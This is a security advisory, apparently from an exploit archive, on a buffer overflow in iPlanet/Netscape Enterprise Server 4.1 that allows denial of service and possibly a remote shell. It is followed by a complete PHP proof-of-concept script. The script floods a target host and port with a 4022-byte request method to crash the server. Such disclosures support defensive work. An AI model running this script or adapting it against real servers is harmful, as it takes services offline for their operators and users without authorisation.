source: http://www.securityfocus.com/bid/2732/info
 
iPlanet Webserver is an http server product offered by the Sun-Netscape Alliance.
 
By sending a specially crafted request (composed of at least 2000 characters) it is possible to cause a buffer overflow. This could cause the termination of the affected service, requiring a restart and enabling a remote attacker to effect a denial of service attack.
 
If the submitted buffer is properly structured, it may yield a remote system shell.
 
Successful exploitation of this vulnerability could lead to a complete compromise of the host.
 
Note that while only installations of iWS4.1sp3-7 on Windows NT are immediately vulnerable to this attack, all users of iWS4.1sp3-7 are advised to install the NSAPI. 

#!/usr/local/bin/php -q
<?
/*
 * Netscape Enterprise Server 4 Method and URI overflow 
 *
 * By sending an invalid method or URI request of 4022 bytes Netscape 
 * Enterprise Server will 
 * stop responding to requests. 
 *
 * Written by Gabriel Maggiotti
 */

	if( $argc!=3)
	{
	echo "usagge: $argv[0] <host> <port>\n";
	return 1;
	}


$host=$argv[1];
$port=$argv[2];

	for($i=0;$i<4022;$i++)
		$overflow.="A";
	
$overflow.=" /index.htm HTTP/1.0\n\n";

$fp = fsockopen ($host, $port , &$errno, &$errstr, 30);
 if (!$fp) {
     echo "Couldn't create connection<br>\n";
 } else {
	fputs ($fp, $overflow);
}
fclose ($fp);

?>